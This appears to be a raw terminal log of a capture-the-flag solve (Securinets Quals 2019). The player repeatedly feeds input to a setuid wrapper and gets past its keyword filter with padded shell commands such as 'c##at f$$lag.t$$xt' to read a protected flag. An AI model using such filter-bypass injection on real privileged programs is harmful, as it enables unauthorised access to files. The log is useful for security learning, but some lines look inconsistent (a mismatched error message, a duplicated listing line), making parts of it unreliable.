@@ -1,0 +1,169 @@
+root@kali:~/Downloads# ssh welcome@51.254.114.246
+load pubkey "/root/.ssh/id_rsa": invalid format
+The authenticity of host '51.254.114.246 (51.254.114.246)' can't be established.
+ECDSA key fingerprint is SHA256:3eQMDCWH3uVdTyUs4Y0N1DdTKHQyX9ETcdc6RJAkYaE.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '51.254.114.246' (ECDSA) to the list of known hosts.
+welcome@51.254.114.246's password: 
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sun Mar 24 00:43:33 2019 from 79.54.149.188
+$ ls
+flag.txt  welcome  welcome.c  wrapper  wrapper.c
+$ cat flag.txt
+cat: flag.txt: Permission denied
+$ ./welcome
+-sh: 5: ./welcome: Permission denied
+$ chmod +x welcome
+-sh: 7: chmod: not found
+$ pwd
+/home/welcome
+$ 
+$ ls -ltr
+total 40
+-rw-r----- 1 root            root              175 Mar 23 12:27 welcome.c
+-r--r--r-- 1 welcome-cracked welcome          8712 Mar 23 19:09 welcome
+-rw-r--r-- 1 root            root             1741 Mar 23 20:13 wrapper.c
+-r-sr-x--- 1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper
+-r--r-x--- 1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt
+$ whoami
+welcome
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+asda
+sh: 1: asda: not found
+$ 
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+cat
+$ vi wrapper.c	
+$ 
+$ exit
+Connection to 51.254.114.246 closed.
+root@kali:~/Downloads# scp welcome@52.254.114.246:wrapper.c .
+bc09c4a0a957b3c6d8adbb47ab0419f7]
+^Croot@kali:~/Downloads# scp welcome@52.254.114.246:wrapper.c wrapper.c
+^Croot@kali:~/Downloadsssh welcome@51.254.114.246
+load pubkey "/root/.ssh/id_rsa": invalid format
+welcome@51.254.114.246's password: 
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sun Mar 24 00:49:13 2019 from 107.185.69.131
+$ 
+$ ls
+flag.txt  welcome  welcome.c  wrapper  wrapper.c
+$ vi wrapper.c
+$                 
+$ 
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+less flag.txt
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+cat flag.txt
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+python
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+vi flag.txt
+$ packet_write_wait: Connection to 51.254.114.246 port 22: Broken pipe
+root@kali:~/Downloads# ssh welcome@51.254.114.246
+load pubkey "/root/.ssh/id_rsa": invalid format
+welcome@51.254.114.246's password: 
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sun Mar 24 12:21:37 2019 from 102.158.7.128
+$ 
+$ ls
+flag.txt  welcome  welcome.c  wrapper  wrapper.c
+$ 
+$ cat flag.txt
+cat: flag.txt: Permission denied
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f##lag.txt
+cat: f##lag.time: No such file or directory
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+w##elcome
+sh: 1: welcome: not found
+$ sls
+-sh: 7: sls: not found
+$ ls
+flag.txt  welcome  welcome.c  wrapper  wrapper.c
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+./w##elcome
+sh: 1: ./welcome: Permission denied
+$ ls -ltr
+total 40
+-rw-r----- 1 root            root              175 Mar 23 12:27 welcome.c
+-r-------- 1 welcome-cracked welcome          8712 Mar 23 19:09 welcome
+-rw-r--r-- 1 root            root             1741 Mar 23 20:13 wrapper.c
+-r-s--x--- 1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper
+-r-------- 1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt
+-r-------- 1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f##lag.txt
+cat: f##lag.time: No such file or directory
+$ ./wrapper
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f$$lag.t$$xt
+securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
+$ 
+
